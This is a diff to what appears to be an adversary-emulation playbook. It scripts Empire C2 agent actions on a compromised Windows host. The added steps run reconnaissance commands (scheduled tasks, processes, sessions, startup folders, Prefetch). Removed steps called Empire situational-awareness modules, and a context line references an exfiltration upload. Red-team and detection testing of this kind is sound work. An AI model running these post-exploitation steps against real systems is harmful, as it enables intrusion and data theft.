@@ -32,7 +32,7 @@ resource "workspace_put_url" "upload_url" {
     filename = variable.exfil_file
 }
 
-action "agent_action" "cli_checks" {
+action "agent_action" "cli_checks_1" {
     delay      = "15"
     timeout    = "180"
     task_name  = variable.c2_task_name
@@ -46,13 +46,43 @@ action "agent_action" "cli_checks" {
     }
 }
 
+action "agent_action" "cli_checks_2" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.cli_checks_1
+
+    execute_empire_agent_shell_command = {
+        command           = "$commandArray = @({schtasks /Query},{tasklist},{qwinsta},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
+action "agent_action" "cli_checks_3" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_empire_agent_shell_command"
+    depends_on = action.agent_action.cli_checks_2
+
+    execute_empire_agent_shell_command = {
+        command           = "$commandArray = @({ls ${variable.system_root_drive}:\Program Files},{ls ${variable.system_root_drive}:\Documents and Settings\All Users\Start Menu\Programs\Startup},{ls ${variable.system_root_drive}:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup},{ls ${variable.system_root_drive}:\Windows\Prefetch},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
 action "agent_action" "drive_info" {
     delay      = "15"
     timeout    = "180"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
     command    = "execute_empire_agent_shell_command"
-    depends_on = action.agent_action.cli_checks
+    depends_on = action.agent_action.cli_checks_3
 
     execute_empire_agent_shell_command = {
         command          = "Get-PSDrive"
@@ -103,67 +133,13 @@ action "agent_action" "antivirusproduct" {
     }
 }
 
-action "agent_action" "get_proxy" {
-    delay      = "15"
-    timeout    = "180"
-    task_name  = variable.c2_task_name
-    agent_name = variable.agent_name
-    command    = "execute_empire_agent_module"
-    depends_on = action.agent_action.antivirusproduct
-
-    execute_empire_agent_module = {
-        module            = "powershell/situational_awareness/host/get_proxy"
-        wait_for_results  = "true"
-        completion_string = "completed"
-    }
-}
-
-action "agent_action" "get_uaclevel" {
-    delay      = "15"
-    timeout    = "180"
-    task_name  = variable.c2_task_name
-    agent_name = variable.agent_name
-    command    = "execute_empire_agent_module"
-    depends_on = action.agent_action.get_proxy
-
-    execute_empire_agent_module = {
-        module            = "powershell/situational_awareness/host/get_uaclevel"
-        wait_for_results  = "true"
-        completion_string = "completed"
-    }
-}
-
-action "agent_action" "computerdetails" {
-    delay      = "15"
-    timeout    = "180"
-    task_name  = variable.c2_task_name
-    agent_name = variable.agent_name
-    command    = "execute_empire_agent_module"
-    depends_on = action.agent_action.get_uaclevel
-
-    execute_empire_agent_module = {
-        module            = "powershell/situational_awareness/host/computerdetails"
-        wait_for_results  = "true"
-        completion_string = "completed"
-
-        module_args = {
-            Limit     = "100"
-            4648      = ""
-            4624      = ""
-            AppLocker = ""
-            PSScripts = ""
-            SavedRDP  = ""
-        }
-    }
-}
-
 action "agent_action" "seatbelt_user" {
     delay      = "15"
     timeout    = "300"
     task_name  = variable.c2_task_name
     agent_name = variable.agent_name
     command    = "execute_empire_agent_module"
-    depends_on = action.agent_action.computerdetails
+    depends_on = action.agent_action.antivirusproduct
 
     execute_empire_agent_module = {
         module            = "powershell/situational_awareness/host/seatbelt"
